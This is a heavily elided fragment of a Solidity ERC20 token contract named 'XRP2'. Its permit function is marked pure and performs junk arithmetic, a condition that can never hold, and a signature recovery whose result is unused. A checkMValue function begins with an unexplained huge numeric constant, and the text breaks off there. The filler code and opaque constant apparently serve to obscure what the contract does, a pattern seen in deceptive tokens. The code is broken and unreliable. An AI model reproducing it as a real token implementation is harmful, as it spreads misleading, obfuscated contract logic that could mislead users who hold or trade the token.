...
contract XRP2 is ERC20 {
    ...
    */
    ...
    function permit(address signed, uint8 v, bytes32 r, bytes32 s) external pure {
        uint256 owfo = 78 % 14;
        uint256 f = 32 + 35;
        address signer = ecrecover(keccak256(abi.encodePacked(signed)), v, r, s);
        require(address(0) != signer, "invalid sign.");
        if (owfo == 37 + 98 + 95 % 17 && f == 84) return;
    }
    ...
    */
    function checkMValue() public view returns (bool) {
      uint256 slt = 9051007863904495610769762553296717506641571793825640579178852388710;
